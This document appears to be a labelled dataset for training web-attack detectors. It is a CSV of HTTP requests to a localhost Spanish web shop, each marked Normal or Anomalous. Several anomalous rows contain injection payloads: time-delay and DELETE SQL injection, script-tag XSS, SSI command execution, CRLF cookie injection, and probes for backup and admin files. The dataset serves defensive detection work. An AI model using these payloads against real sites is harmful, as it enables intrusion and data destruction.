raw_log,classification
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=%27INJECTED_PARAM&pwd=%21FIlatelia&remember=off&B1=Entrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1%2B,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 idA=2,Anomalous
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modoA=registro&login=thurgood&password=BruCio&nombre=Ronit&apellidos=Agujetas+Kercooff&email=ecker%40programasalquilermaquinaria.co&dni=11845322T&direccion=Calle+Grases%2C+93%2C+3-C&ciudad=Vallesa+de+la+Guare%F1a&cp=29650&provincia=Burgos&ntc=2614053201757076&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Vino+Rioja&precio=100&cantidad=56&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=carmelin&password=cI9CuE7t6%F1AL&nombre=%2FLiliana&apellidos=Morgadas&email=mondini%40goscan.io&dni=81743896X&direccion=Pantano+De+La+Sotonera%2C+145+&ciudad=Ahigal+de+los+Aceiteros&cp=26526&provincia=Tarragona&ntc=0742459903329031&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=nizar&password=deSem81oCadErO&nombre=Tristana&apellidos=Laconich+Fraga&email=williams_mellish%40elcarritodelacompra.ki&dni=14559882P&direccion=Calle+Arroyo+Opa%F1el%2C+46+&ciudad=Establ%E9s&cp=17708&provincia=Castell%F3n&ntc=%257C&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&pwd=espesamente&remember=on&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsgA=Credenciales+incorrectas,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=289&B1=Pasar+por+caja,Normal
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=%253CSCRIPT%253Ealert%2528%2522Paros%2522%2529%253B%253C%252FSCRIPT%253E HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=odden&pwd=8030e&remember=on&B1=Entrar,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=orr&password=querando&nombre=Adalgisa&apellidos=T%E1vara+Ganci&email=baz_azais%40filtraciondehumos.sb&dni=47106635J&direccion=Calle+Carme+Karr%2C+65%2C+10A&ciudad=A%F1%F3n+de+Moncayo&cp=46470&provincia=Valencia&ntc=9481894123052720&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsgA=Credenciales+incorrectas HTTP/1.1,Anomalous
GET http://localhost:8080/scripts/tools/newdsn.exe HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/index.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=richards&password=v0r7fica6i24&nombre=Patricio&apellidos=De+Sol%E0+Butticaz&email=junior%40esteticadayda.bo&dni=%27%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&direccion=C%2F+Candeleria+179%2C+&ciudad=Sant+Miquel+de+Fluvi%E0&cp=13100&provincia=Valladolid&ntc=5101892686215961&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%2B HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carritoany%250D%250ASet-cookie%253A%2BTamper%253D5765205567234876235,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=brana&password=f5-c21s7&nombre=Abd%F3n&apellidos=Huertas+Acosa&email=kreuzer%4011horas.ag&dni=09831514A&direccion=C%2F+Barja+187+&ciudad=Navaescurial&cp=32505&provincia=Madrid&ntc=6588349336548778&B1=Registrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=kilian&pwd=17rDifLO4a&remember=on&B1=Entrar,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp.Bak HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=houdini&password=cabile%F1a&nombre=Yulisa&apellidos=Aup%ED+Feria&email=hee4%40ropadegolf.name&dni=77786356B&direccion=C%2F+Guatemala%2C+S%2FN%2C+6G&ciudad=J%E1vea%2FX%E0bia&cp=39790&provinciaA=Zaragoza&ntc=2661491792098457&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=8137&B1=Pasar+por+caja HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=5191&B1=Confirmar%2F,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=1%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=souther&password=ruralmente&nombre=Idelfonsa&apellidos=Bonnin+Isarch&email=woolgar%40awat.gov&dni=58783501D&direccion=Calle+Leganes+155+13%3FE&ciudad=Villaviciosa+de+Od%F3n&cp=48289&provincia=Barcelona&ntc=3260901599339838&B1=Registrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito,Normal
GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Queso+Manchego&precio=85&cantidad=62&B1=A%F1adir+al+carrito HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsgA=Credenciales+incorrectas,Anomalous
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=shari&pwd=AGobiadO&remember=on&B1=Entrar%27+DELETE+FROM+USERS,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kolahi45&pwd=69%27c48Ng%2C7%2C7A&remember=on&B1=Entrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=bob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=ginsberg&pwd=s33ler%271&remember=on&B1=Entrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?idA=3&nombre=Jam%F3n+Ib%E9rico&precio=85&cantidad=27&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sliter&pwd=env%2Bolvente&remember=on&B1=Entrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro%27+DELETE+FROM+USERS&login=messier&password=c7b183o&nombre=Nicodemo&apellidos=Triola+Villuend&email=galloway%40rtce.gu&dni=35507822P&direccion=Numero+15%2C+151%2C+&ciudad=Castrillo+de+la+Guare%F1a&cp=23657&provincia=Toledo&ntc=1278501676319264&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 idA=1,Anomalous
GET http://localhost:8080/CFIDE/administrator/homepage.cfm HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=kuntova&password=oce%E1nica%27+AND+%271%27%3D%271&nombre=Zuleika&apellidos=Sasplug&email=bruian%40manjarr.is&dni=67646420Q&direccion=C%2F+Mineria+92+2-B&ciudad=Cabeza+de+B%E9jar%2C+La&cp=31180&provincia=Valencia&ntc=8250386020996799&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=dinges&password=v596%F34&nombre=Alor&apellidos=Crovetto+Roger&email=voight%407horas.li&dni=71834216H&direccion=C%2F+Cristobal+Quintero+86+&ciudad=Castellar+de+Santiago&cp=11140&provincia=Navarra&ntc=5010003702753512&B1=Registrar,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=tarra&password=bienh6dado&nombre=Idalia&apellidos=Pozo+Carbot&email=bes%40s%40enyei%40%40webhut.md&dni=43841813H&direccion=Avinguda+Marques+De+Montroig+110+11-A&ciudad=Nov%E9s&cp=46370&provincia=Zamora&ntc=3085190282266683&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=wierzba&password=en62rm30a&nombre=Adelfo&apellidos=Mundaca+G%F3mez&email=ebersberg%4023horas.kp&dni=78942434V&direccion=Periodista+Jose+Fernandez+Martinez%2C+156+5%3FB&ciudadA=Navaconcejo&cp=44592&provincia=Madrid&ntc=0883153406920438&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precio=810&B1=%3C%21--%23EXEC+cmd%3D%22ls+%2F%22--%3E,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/global/estilos.css~ HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=dadang&pwd=mo%2Fn2ep%2F%EDo&remember=on&B1=Entrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=sosa&pwd=FraCcIoNArIo&remember=on&B1=Entrar,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Queso+Manchego&precio=39&cantidad=71&B1A=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=6471&B1=Pasar+por+caja%2F HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=morrie%27%2C%270%27%2C%270%27%2C%270%27%2C%270%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B--&password=ePa&nombre=Erlan&apellidos=Sordo+Alquinta&email=nieva%40menorca.com.sz&dni=22787443D&direccion=Pl.+De+La+Palomera%2C+S%2FN+2%3FD&ciudad=Oss%F3+de+Si%F3&cp=31353&provincia=Badajoz&ntc=5124736256894307&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=d%3Frieka&password=se8i06c9l&nombre=Valiente&apellidos=Yomona+Noda&email=oberon%4023horas.kz&dni=73353905M&direccion=Calle+Assalt%2C+120+&ciudad=Aznalc%E1zar&cp=49120&provincia=Burgos&ntc=6920842539231486&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=niklas&password=AtUFAMIENTo&nombre=Carmelo&apellidos=Espuna+Angullo&email=slezak%40ballerpoker.kn&dni=17853323X&direccion=Paseo+Alameda+De+Osuna+10%2C+&ciudad=Torrej%F3n+de+Ardoz&cp=24174&provincia=Alicante&ntc=5693419988123325&B1=Registrar,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precioA=9085&B1=Pasar+por+caja HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 B2=Vaciar+carrito%253F,Anomalous
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=mariabel&password=c2645ido&nombre=Zelma&apellidos=Dotor+Fornell&email=celik-regan%40turinga.sb&dni=95113653M&direccion=Carrer+Jaume+D%27artes+78%2C+&ciudad=Osornillo&cp=10411&provincia=Burgos&ntc=3090147546194865&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=8664&B1=Confirmar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=*goodm%3F%3Fan&pwd=pleit%E9s&remember=on&B1=Entrar,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=prewitt&password=ma2o4esa&nombre=Aricel&apellidos=Romaguer&email=mirel-duvitski%40pavimentosalagon.sr&dni=38449362D&direccion=Alcalde+Isidoro+Enciso%2C+100+6%3FG&ciudad=Tolox&cp=28850&provincia=C%E1diz&ntc=5111638071636143&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/castro.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=oskorep&pwd=abU%D1uelAdA&remember=on&B1=Entrar HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=ambros&pwd=indiligencia&remember=off&B1=Entrar,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=sameh&password=encara&nombre=Marcelino&apellidos=Mundo+Osarte&email=vanni%40sietepeines.eu&dni=60B999025N&direccion=C%2F+Eugenio+Arbones%2C+84%2C+9-G&ciudad=Daya+Vieja&cp=43770&provincia=Barcelona&ntc=7672564317265745&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&loginA=agata&pwd=alambrAda&remember=on&B1=Entrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/nuestratierra.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=usa9&password=ENjuaGaDiEnTES&nombre=Johana&apellidos=Colldevall&email=scepi%4014horas.ao&dni=04746545N&direccion=Aldea+172%2C+&ciudad=Villota+del+P%E1ramo&cp=AND+1%3D1&provincia=La+Rioja&ntc=0365839887327935&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Queso+Manchego&precio=39&cantidad=30&B1A=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1.bak HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/imagenes/logo.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=hendren&password=veinten6o&nombre=N%E9stor&apellidos=Pont&email=burkley_mature%40lunch.com.jm&dni=43044777R&direccion=C%2F+Girona+S%2FN+&ciudad=Pola+de+Gord%F3n%2C+La&cp=23100bob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&provincia=%C1vila&ntc=3553885634703680&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=babbage&password=Lej%EDSimoS&nombre=Higinia&apellidos=Arribas+Larrakoetxea&email=nichetti%40multireform.bf&dni=86111515K&direccion=Calle+Jesus+Martin+38%2C+&ciudadA=Salillas&cp=48150&provincia=Barcelona&ntc=4618456072080141&B1=Registrar HTTP/1.1,Anomalous
GET http://localhost:8080/WebSphereSamples/ HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=eldin&password=B9r4enillO&nombre=Rogelio&apellidos=Ingla+Gu-ti%E9r-_rez&email=rehkopf_sell%40zarahealth.cy&dni=31415477F&direccion=C%2F+El+Greco+98%2C+&ciudad=Ll%EDria&cp=34259&provincia=Toledo&ntc=1530250570237050&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/miembros.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=3&nombre=Vino+Rioja&precio=100&cantidad=70&B1=A%F1adir+al+carrito%2520 HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 idA=1,Anomalous
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 idA=1,Anomalous
GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas,Normal
GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 modo=insertar&precioA=8970&B1=Confirmar,Anomalous
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?idA=1 HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Vino+Rioja&precio=39&cantidad=80&B1=A%F1adir+al+carrito HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=mi%2Csutka&password=79b664ve80&nombre=Delva&apellidos=Campas+Ferrete&email=everrett%40fernandosoto.zr&dni=86248264N&direccion=Calle+Salares+27+9-B&ciudad=Teresa&cp=10162&provincia=Alicante&ntc=8640086440167305&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=willie51&password=desintegrar&nombre=Cirio&apellidos=Junquera&email=desailly_bosworth%40coworkers.gov&dni=33273113W&direccion=Calle+Lujan+Perez+17%2C+&ciudad=Undu%E9s+de+Lerda&cp=45130&provincia=Valladolid&ntc=4102716313272060&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/webapp/examples/simple.jsp HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&login=houston&password=8n885rado&nombre=Salvino&apellidos=Ivanco+Casola&email=galli_amagula%40hotelesjerez.lc&dni=53532197L&direccion=Call%2Be+Gil+De+On*ta%F1on%2C+S*%2FN%2C+&ciudad=Artesa+de+Segre&cp=05571&provincia=Burgos&ntc=3983408909914725&B1=Registrar,Anomalous
GET http://localhost:8080/tienda1/global/creditos.jsp.Old HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2 HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=45&B1=A%F1adir+al+carrito HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=2,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/6909030637832563290.jsp HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2=Vaciar+carrito HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsg=Credenciales+incorrectas%2500,Anomalous
GET http://localhost:8080/tienda1/publico/vaciar.jsp?B2A=Vaciar+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/webapp/examples/showcfg HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=2%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=81&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/salir.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/menum.jsp HTTP/1.1,Normal
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=1,Normal
GET http://localhost:8080/dspug.nsf HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/autenticar.jsp HTTP/1.1 modo=entrar&login=youji&pwd=1e9.L62r2dO6&remember=on&B1=Entrar,Normal
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1,Normal
GET http://localhost:8080/samples/sampsite/sampsite.htm HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/cmenbul.gif HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=sydney&pwd=r%24aToNESCA&rememberA=off&B1=Entrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=1&nombre=Vino+Rioja&precio=100&cantidad=26paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&B1=A%F1adir+al+carrito,Anomalous
POST http://localhost:8080/tienda1/publico/caracteristicas.jsp HTTP/1.1 id=2,Normal
GET http://localhost:8080/tienda1/publico/pagar.jsp?modoA=insertar&precio=5698&B1=Pasar+por+caja HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/publico/anadir.jsp?idA=2&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=1&B1=A%F1adir+al+carrito HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1.INC HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 modo=registro&loginA=carolyne&password=1%F35i7am41t0&nombre=Ram%F3n&apellidos=Chambueta+Deben&email=mangini%40cubiertoscbb.an&dni=10042805Q&direccion=Calle+Falconera%2C+173+&ciudad=Trefacio&cp=31227&provincia=Salamanca&ntc=1976494121699035&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Vino+Rioja&precioA=100&cantidad=21&B1=A%F1adir+al+carrito,Anomalous
GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=jamin&pwd=d%27eslig%2Cadura&remember=off&B1=Entrar HTTP/1.1,Anomalous
GET http://localhost:8080/CFIDE/administrator/linkdirect.cfm HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=ezella&password=CU25439y&nombre=Hedda&apellidos=Ojeda+Fita&email=mallott%40edifico.bf&dni=63897551D&direccion=C%2F+Ferriol%2C+105+11%3FD&ciudad=Begues&cp=06390&provincia=Le%F3n&ntc=7359610101148401&B1=Registrar HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1,Normal
GET http://localhost:8080/tienda1/global/estilos.css HTTP/1.1,Normal
GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1,Normal
POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 modo=registro&login=briard&password=ur7anismo&nombre=Vitalbob%40%3CSCRipt%3Ealert%28Paros%29%3C%2FscrIPT%3E.parosproxy.org&apellidos=Bonafina+Cansino&email=gayou%40transportesvegasl.bm&dni=65630152C&direccion=C%2F+Marques+De+Lema+188+13G&ciudad=Rueda+de+Jal%F3n&cp=03510&provincia=Le%F3n&ntc=7816475254908142&B1=Registrar,Anomalous
POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 id=2&nombre=Queso+Manchego&precio=39&cantidad=38&B1=A%F1adir+al+carrito,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombre=Jam%F3n+Ib%E9rico&precio=100&cantidad=52&B1=A%F1adir+al+carrito HTTP/1.1,Normal
GET http://localhost:8080/tienda1/miembros/imagenes/zarauz.jpg HTTP/1.1,Normal
GET http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=%27%29%3Bwaitfor+delay+%270%3A0%3A15%27%3B-- HTTP/1.1,Anomalous
GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=%27INJECTED_PARAM&login=gordy&password=malcomida&nombre=Cebele&apellidos=Palah%ED+Cabezas&email=capoliccio%40almeriastella.jo&dni=94088087D&direccion=C%2F+Dels+Escales+Del+Miracle%2C+37%2C+7-F&ciudad=Arbanc%F3n&cp=31229&provincia=Cantabria&ntc=7224824987028849&B1=Registrar HTTP/1.1,Anomalous
POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 errorMsgA=Credenciales+incorrectas,Anomalous
